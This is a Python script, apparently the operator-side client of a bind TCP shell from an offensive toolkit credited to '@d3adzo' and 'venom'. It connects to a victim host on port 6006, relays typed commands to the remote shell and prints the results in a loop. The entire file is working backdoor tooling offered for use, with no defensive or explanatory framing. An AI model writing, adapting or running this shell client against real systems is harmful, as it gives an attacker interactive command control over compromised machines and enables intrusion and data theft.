######################################################
# Author: @d3adzo (bind TCP shell)                   #
# revision: @r00t-3xp10it (@venom)                   #
# shepard working directory: %tmp%                   #
# Python Script (SERVER) version: 1.0.4              #
######################################################

## Imports
import socket, sys, time, os
from os import system

## shell settings
host = sys.argv[1]
port = 6006

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((host, port))
except:
    print('[error] could not connect to: ' + host + ' on: 6006 tcp')
    time.sleep(2) ## Added sleep time!
    exit()

print("-> [[ Connected to " + str(host) + ' on port ' + str(port) + ' tcp ]] <-')
time.sleep(1.6) ## Added sleep time!

nextcmd = 'help'
s.sendall((nextcmd + '\r\n').encode())

while True:
    data = s.recv(4096)
    while 'EOFX' not in data.decode():
        data += s.recv(4096)
    datarr = data.decode().split('\r\n')
    for line in datarr[:-3]:
        print(line)
    print("Current path: " + datarr[-3])
    print("Shell options: powershell -file redpill.ps1 -help parameters")
    nextcmd = input("@shepard > ")
    if nextcmd == 'cls':
        system('cls')
    if nextcmd == 'quit':
        nextcmd += '\r\n'
        s.sendall(nextcmd.encode())
        s.close()
        break
    else:
        nextcmd += '\r\n'
        s.sendall(nextcmd.encode())